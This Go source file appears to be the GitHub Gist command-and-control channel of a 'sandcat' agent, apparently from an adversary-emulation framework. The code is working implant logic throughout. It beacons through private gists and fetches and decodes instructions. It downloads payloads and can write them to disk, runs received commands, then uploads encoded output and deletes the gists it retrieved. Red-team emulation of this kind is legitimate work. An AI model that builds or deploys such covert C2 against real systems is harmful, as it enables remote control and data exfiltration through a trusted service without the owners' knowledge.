package contact

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
	"path/filepath"

	"../executors/execute"
	"../output"
	"../util"
)

const (
	githubTimeout = 60
	githubTimeoutResetInterval = 5
	githubError = 500
)

var (
	token = ""
	username string
)

type GIST struct {}

func init() {
	output.VerbosePrint("Token: " + token)
	CommunicationChannels["GIST"] = GIST{}
}

//GetInstructions sends a beacon and returns instructions
func (g GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	checkValidSleepInterval(profile)
	bites, heartbeat := gistBeacon(profile)
	var out map[string]interface{}
	if heartbeat == true {
		output.VerbosePrint("[+] Beacon: ALIVE")
		if bites != nil {
			var commands interface{}
			json.Unmarshal(bites, &out)
			json.Unmarshal([]byte(out["instructions"].(string)), &commands)
			out["sleep"] = int(out["sleep"].(float64))
			out["instructions"] = commands
		}
	} else {
		output.VerbosePrint("[-] Beacon: DEAD")
	}
	return out
}

//GetPayloadBytes load payload bytes from github
func (g GIST) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
	var payloadBytes []byte
	location := ""
	output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
	payloads := getGists("payloads", fmt.Sprintf("%s-%s", uniqueID, payload))
	if payloads[0] != "" {
		if writeToDisk {
			location = filepath.Join(payload)
			util.WritePayloadBytes(location, util.Decode(payloads[0]))
		} else {
			payloadBytes = util.Decode(payloads[0])
		}
	}
	return location, payloadBytes
}

//RunInstruction runs a single instruction
func (g GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
	result := make(map[string]interface{})
	outputData, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), command["timeout"].(int))
	result["id"] = command["id"]
	result["output"] = outputData
	result["status"] = status
	result["pid"] = pid
	g.SendExecutionResults(profile, result)
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (g GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) bool {
	if len(criteria["c2Key"]) > 0 {
		token = criteria["c2Key"]
		return true
	}
	return false
}

//SendExecutionResults send results to the server
func (g GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	gistResults(profile["paw"].(string), result)
}


func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
	heartbeat := createHeartbeatGist("beacon", profile)
	//collect instructions & delete
	contents := getGists("instructions", profile["paw"].(string))
	if contents != nil {
		return util.Decode(contents[0]), heartbeat
	}
	return nil, heartbeat
}

func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
	data, _ := json.Marshal(profile)
	if createGist(gistType, profile["paw"].(string), data) != created {
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	}
	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
	return true
}

func gistResults(uniqueId string, result map[string]interface{}) {
	link := fmt.Sprintf("%s", result["id"].(string))
	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode([]byte(fmt.Sprintf("%v", result["output"].(interface{}))))), "status": result["status"].(string), "pid": result["pid"].(string)})
	if createGist("results", uniqueId, data) != created {
		output.VerbosePrint(fmt.Sprintf("[-] Results %s GIST: FAILED", link))
	} else {
		output.VerbosePrint(fmt.Sprintf("[+] Results %s GIST: SUCCESS", link))
	}
}


func createGist(gistType string, uniqueId string, data []byte) int {
	ctx := context.Background()
	c2Client := createNewClient()
	gistDescriptor := getGistDescriptor(gistType, uniqueId)
	stringified := string(util.Encode(data))
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistDescriptor)] = file
	public := false
	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
	_, resp, err := c2Client.Gists.Create(ctx, &gist)
	if err != nil {
		return githubError
	}
	return resp.StatusCode
}

func getGists(gistType string, uniqueID string) []string {
	ctx := context.Background()
	c2Client := createNewClient()
	var contents []string
	gists, _, err := c2Client.Gists.List(ctx, username, nil)
	if err == nil {
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						contents = append(contents, *file.Content)
					}
				}
				c2Client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
	}
	return contents
}

func getGistDescriptor(gistType string, uniqueId string) string {
	return fmt.Sprintf("%s-%s", gistType, uniqueId)
}

func checkValidSleepInterval(profile map[string]interface{}) {
	if profile["sleep"] == githubTimeout{
		util.Sleep(float64(githubTimeoutResetInterval))
	}
}

func createNewClient() *github.Client {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	c2Client := github.NewClient(tc)
	return c2Client
}